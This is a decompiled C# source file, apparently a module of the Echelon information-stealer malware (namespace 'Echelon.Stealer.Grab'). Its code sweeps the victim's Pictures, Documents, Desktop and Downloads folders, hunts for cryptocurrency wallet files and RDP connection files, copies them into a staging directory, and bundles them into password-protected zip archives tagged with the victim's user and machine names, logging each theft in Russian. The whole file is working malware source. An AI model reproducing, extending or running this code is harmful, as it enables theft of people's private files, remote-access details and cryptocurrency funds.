using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Echelon.Global;
using Ionic.Zip;
using Ionic.Zlib;

namespace Echelon.Stealer.Grab
{
	// Token: 0x0200002B RID: 43
	internal class Grab
	{
		// Token: 0x060000A2 RID: 162
		[DllImport("shell32.dll", CharSet = CharSet.Unicode)]
		private static extern int SHGetKnownFolderPath([MarshalAs(UnmanagedType.LPStruct)] Guid rfid, uint dwFlags, IntPtr hToken, out string pszPath);

		// Token: 0x060000A3 RID: 163 RVA: 0x0001BDA0 File Offset: 0x00019FA0
		public static void may()
		{
			Grab.SHGetKnownFolderPath(Grab.KnownFolder.Downloads, 0U, IntPtr.Zero, out Grab.downloads);
			if (Program.enableGrab)
			{
				if (Program.steal_from_MyPictures)
				{
					Grab.myFiles.AddRange(Help.GetFilesDoc(Help.pictures, "*.*"));
				}
				if (Program.steal_from_documents)
				{
					Grab.myFiles.AddRange(Help.GetFilesDoc(Help.MyDocuments, "*.*"));
				}
				if (Program.steal_from_desktop)
				{
					Grab.myFiles.AddRange(Help.GetFilesDoc(Help.DesktopPath, "*.*"));
				}
				if (Program.steal_from_downloads)
				{
					Grab.myFiles.AddRange(Help.GetFilesDoc(Grab.downloads, "*.*"));
				}
			}
			Grab.listWallet.AddRange(Help.GetWall(Help.UserProfile, "*.*"));
			Grab.listRdp.AddRange(Help.GetRdp(Help.UserProfile, "*.*"));
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x0001BE80 File Offset: 0x0001A080
		public static void Graber(List<string> files, string dir0, string dirjust, string type, int peremen, string dirname, long size)
		{
			foreach (string text in files)
			{
				if (!Ober.AMBAL_DExist(dir0))
				{
					Ober.AMBAL_CreateDir(dir0);
				}
				if (Help.CalculateDirectorySize(new DirectoryInfo(dir0), true) >= Grab.SizeZip)
				{
					using (ZipFile zipFile = new ZipFile())
					{
						zipFile.ParallelDeflateThreshold = -1L;
						zipFile.UseZip64WhenSaving = Zip64Option.Always;
						zipFile.Password = Program.passwordzip;
						zipFile.AlternateEncodingUsage = ZipOption.Always;
						zipFile.AlternateEncoding = Encoding.GetEncoding(866);
						zipFile.CompressionLevel = CompressionLevel.BestCompression;
						zipFile.AddDirectory(dir0);
						zipFile.Save(string.Concat(new string[]
						{
							dir0,
							"_",
							Help.userName,
							"_",
							Help.machineName,
							".zip"
						}));
					}
					Grab.Zip.Add(string.Concat(new string[]
					{
						dir0,
						"_",
						Help.userName,
						"_",
						Help.machineName,
						".zip"
					}));
					Help.DeleteDirectory(dir0);
					peremen++;
					dir0 = dirjust + dirname + peremen.ToString();
					Directory.CreateDirectory(dir0);
				}
				string text2 = Ober.AMBAL_GetFileName(text);
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
				string text3 = Ober.AMBAL_GetExtension(text);
				string text4 = Ober.AMBAL_GetFileName(Ober.AMBAL_GetDirName(text));
				string kavo_s = string.Concat(new string[]
				{
					dir0,
					"\\\\",
					text4,
					"\\\\",
					text2
				});
				string str = string.Concat(new string[]
				{
					dir0,
					"\\\\",
					text4,
					"\\\\",
					fileNameWithoutExtension
				});
				long length = new FileInfo(text).Length;
				if (Path.HasExtension(str + text3) && length <= size)
				{
					try
					{
						if (text3 != ".d")
						{
							if (!Directory.Exists(dir0 + "\\\\" + Ober.AMBAL_GetFileName(Ober.AMBAL_GetDirName(kavo_s))))
							{
								string contents = "Нет папки, создание: " + text4 + Environment.NewLine;
								File.AppendAllText(Grab.loger, contents);
								Directory.CreateDirectory(dir0 + "\\\\" + Ober.AMBAL_GetFileName(Ober.AMBAL_GetDirName(kavo_s)));
								File.Copy(text, str + text3, true);
								Grab.countFiles++;
								string str2 = type + " успешно скопирован: " + text2 + Environment.NewLine;
								File.AppendAllText(Grab.loger, str2 + "==========================================================" + Environment.NewLine);
							}
							else
							{
								if (File.Exists(str + text3))
								{
									if (new FileInfo(text).Length != new FileInfo(str + text3).Length)
									{
										File.Copy(text, string.Concat(new string[]
										{
											dir0,
											"\\\\",
											Ober.AMBAL_GetFileName(Ober.AMBAL_GetDirName(kavo_s)),
											"\\\\",
											fileNameWithoutExtension,
											Grab.rand.Next(0, 9999).ToString(),
											text3
										}), true);
									}
								}
								else
								{
									File.Copy(text, str + text3, true);
								}
								string str3 = type + " успешно скопирован: " + text2 + Environment.NewLine;
								File.AppendAllText(Grab.loger, str3 + "==========================================================" + Environment.NewLine);
								Grab.countFiles++;
							}
						}
					}
					catch
					{
						string str4 = type + " НЕ скопирован: " + text2 + Environment.NewLine;
						File.AppendAllText(Grab.loger, str4 + "!==========================================================!" + Environment.NewLine);
					}
				}
			}
			if (!Ober.AMBAL_DExist(dir0))
			{
				Ober.AMBAL_CreateDir(dir0);
			}
			if (!Ober.AMBAL_FExist(string.Concat(new string[]
			{
				dirjust,
				dirname,
				peremen.ToString(),
				"_",
				Help.userName,
				"_",
				Help.machineName,
				".zip"
			})))
			{
				dir0 = dirjust + dirname + peremen.ToString();
				using (ZipFile zipFile2 = new ZipFile())
				{
					zipFile2.ParallelDeflateThreshold = -1L;
					zipFile2.UseZip64WhenSaving = Zip64Option.Always;
					zipFile2.Password = Program.passwordzip;
					zipFile2.AlternateEncodingUsage = ZipOption.Always;
					zipFile2.AlternateEncoding = Encoding.GetEncoding(866);
					zipFile2.CompressionLevel = CompressionLevel.BestCompression;
					zipFile2.AddDirectory(dir0);
					zipFile2.Save(string.Concat(new string[]
					{
						dir0,
						"_",
						Help.userName,
						"_",
						Help.machineName,
						".zip"
					}));
				}
				Grab.Zip.Add(string.Concat(new string[]
				{
					dir0,
					"_",
					Help.userName,
					"_",
					Help.machineName,
					".zip"
				}));
				Help.DeleteDirectory(dir0);
			}
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x0001C404 File Offset: 0x0001A604
		public static void Wallet(List<string> files)
		{
			string text = Help.collectionDir + "\\Recursive_Wallets";
			if (!Ober.AMBAL_DExist(text))
			{
				Ober.AMBAL_CreateDir(text);
			}
			foreach (string text2 in files)
			{
				string str = Ober.AMBAL_GetFileName(text2);
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text2);
				string a = Ober.AMBAL_GetExtension(text2);
				if (Path.HasExtension(text2))
				{
					try
					{
						if (a == ".dat")
						{
							if (fileNameWithoutExtension.Contains("wallet"))
							{
								File.Copy(text2, text + "\\" + str, true);
								Grab.countWallets++;
							}
						}
						else if (a == ".wallet")
						{
							File.Copy(text2, text + "\\" + str, true);
							Grab.countWallets++;
						}
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x0001C50C File Offset: 0x0001A70C
		public static void Rdp(List<string> files)
		{
			string text = Help.collectionDir + "\\RDP";
			if (!Ober.AMBAL_DExist(text))
			{
				Ober.AMBAL_CreateDir(text);
			}
			foreach (string text2 in files)
			{
				string str = Ober.AMBAL_GetFileName(text2);
				string a = Ober.AMBAL_GetExtension(text2);
				if (Path.HasExtension(text2))
				{
					try
					{
						if (a == ".rdp")
						{
							File.Copy(text2, text + "\\" + str, true);
							Grab.countRdp++;
						}
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x04000070 RID: 112
		private static string downloads;

		// Token: 0x04000071 RID: 113
		public static int countFiles;

		// Token: 0x04000072 RID: 114
		public static int countRdp;

		// Token: 0x04000073 RID: 115
		public static int countWallets;

		// Token: 0x04000074 RID: 116
		public static List<string> myFiles = new List<string>();

		// Token: 0x04000075 RID: 117
		public static List<string> listWallet = new List<string>();

		// Token: 0x04000076 RID: 118
		public static List<string> listRdp = new List<string>();

		// Token: 0x04000077 RID: 119
		public static List<string> Zip = new List<string>();

		// Token: 0x04000078 RID: 120
		public static string DR = Help.dir + "\\\\Grab\\\\";

		// Token: 0x04000079 RID: 121
		public static string TR0 = Grab.DR + "Files" + Grab.x.ToString();

		// Token: 0x0400007A RID: 122
		public static int x = 0;

		// Token: 0x0400007B RID: 123
		private static readonly Random rand = new Random();

		// Token: 0x0400007C RID: 124
		public static string loger = Help.collectionDir + "\\Grabber_Log.txt";

		// Token: 0x0400007D RID: 125
		public static long SizeZip = 8000000L;

		// Token: 0x0200002C RID: 44
		public static class KnownFolder
		{
			// Token: 0x0400007E RID: 126
			public static readonly Guid Downloads = new Guid("374DE290-123F-4565-9164-39C4925E467B");
		}
	}
}
